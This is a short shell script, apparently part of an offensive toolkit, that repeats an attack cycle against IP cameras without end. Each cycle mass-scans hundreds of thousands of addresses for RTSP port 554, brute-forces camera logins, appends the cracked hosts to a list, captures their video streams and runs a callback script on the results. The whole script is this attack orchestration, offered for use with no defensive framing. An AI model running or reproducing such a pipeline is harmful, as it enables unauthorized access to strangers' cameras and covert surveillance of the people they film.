#!/usr/bin/env sh
while true; do
    echo
    echo Remove hosts
    rm ./local/hosts_554.txt
    echo
    echo Gather IPs
    ./fortune_port.py 554 500000 1024 -i tun0
    echo
    echo Brute
    ./rtsp_brute_simple.py \
        -w 1500 -i tun0 -sp > local/bruted.txt
    cat local/bruted.txt >> local/rtsp.txt
    echo
    echo Capture
    ./rtsp_capture.py local/bruted.txt -cb local/campost.sh
done

